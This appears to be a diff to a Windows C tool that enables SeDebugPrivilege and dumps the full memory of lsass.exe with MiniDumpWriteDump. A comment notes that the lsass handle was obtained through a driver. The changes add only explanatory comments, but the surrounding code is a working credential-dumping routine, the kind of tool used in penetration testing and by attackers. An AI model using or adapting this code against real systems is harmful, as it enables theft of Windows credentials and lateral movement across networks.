@@ -88,6 +88,7 @@ int main(int argc, char** argv)
     }
 
     // Enable SeDebugPrivilege
+    // Having an handle on lsass.exe is not enought to dump its memory. The correct privileges are required.
     HANDLE current_token_handle = NULL;
     if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &current_token_handle)) {
         printf("[!] OpenProcessToken() failed with 0x%x\n", GetLastError());
@@ -169,7 +170,7 @@ int main(int argc, char** argv)
 
     // Dump lsass.exe with MiniDumpWriteDump
     if (!MiniDumpWriteDump(
-        lsass_handle,
+        lsass_handle, // Handle obtained with the driver
         lsass_pid,
         outfile,
         MiniDumpWithFullMemory,
